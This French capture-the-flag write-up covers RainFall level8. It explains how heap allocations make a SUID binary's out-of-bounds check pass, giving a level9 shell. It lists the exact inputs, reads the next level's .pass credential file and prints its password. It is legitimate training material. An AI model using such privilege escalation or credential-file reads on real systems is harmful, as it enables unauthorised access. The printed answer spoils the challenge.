# LEVEL8

Le système de fichier se présente de cette manière :

```Diff
level8@RainFall:~$ ls -la

total 17
dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
+rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
rw-r--r-- 1 level8 level8  675 Apr  3  2012 .profile
```

Le binaire `level8` possède le **SUID** et appartient à `level9`. Il s'exécute donc avec les privilèges de `level9`.

## Analyse

Le programme possède deux variables globales :

```c
char *auth;
char *service;
```

Elles sont situées respectivement à :

```text
auth    -> 0x08049aac
service -> 0x08049ab0
```

Au début de chaque boucle, leurs adresses sont affichées :

```asm
printf("%p, %p \n", auth, service);
```

### `auth`

La commande `auth` effectue :

```asm
malloc(4)
```

Puis initialise les 4 octets à `0` :

```asm
mov DWORD PTR [eax], 0x0
```

Le contenu fourni après `auth ` est ensuite copié avec :

```asm
strcpy(auth, buffer + 5)
```

La taille est limitée à 30 caractères avant le `strcpy`.

Le problème apparaît lors de la commande `login` :

```asm
mov eax, DWORD PTR [auth + 0x20]
test eax, eax
```

Le programme lit donc une valeur située **32 octets après le début de `auth`**, alors que seulement 4 octets ont été alloués.

### `service`

La commande :

```text
service
```

effectue :

```asm
strdup(buffer + 7)
```

et stocke le résultat dans `service`.

Les allocations successives permettent donc de contrôler progressivement la disposition du heap :

```text
auth     -> 0x0804a008
service  -> 0x0804a018
service  -> 0x0804a028
```

On peut donc faire en sorte que l'adresse `auth + 0x20` corresponde à une zone allouée par `service`.

## Exploitation

On commence par créer `auth` :

```text
auth
```

On obtient :

```text
0x0804a008, (nil)
```

Puis on effectue deux allocations avec `service` :

```text
service
service
```

Ce qui donne :

```text
0x0804a008, 0x0804a018
0x0804a008, 0x0804a028
```

La zone située à `auth + 0x20` se retrouve alors dans la mémoire contrôlée par les allocations suivantes.

Lorsque `login` est exécuté :

```asm
mov eax, DWORD PTR [auth + 0x20]
test eax, eax
```

la valeur lue est différente de `0`, ce qui permet de passer dans :

```asm
system("/bin/sh");
```

On obtient alors un shell avec l'UID effectif de `level9`.

## Exploit

```bash
./level8
```

Puis :

```text
auth
service
service
login
```

Résultat :

```bash
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
```

On peut ensuite récupérer le mot de passe du niveau suivant :

```bash
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
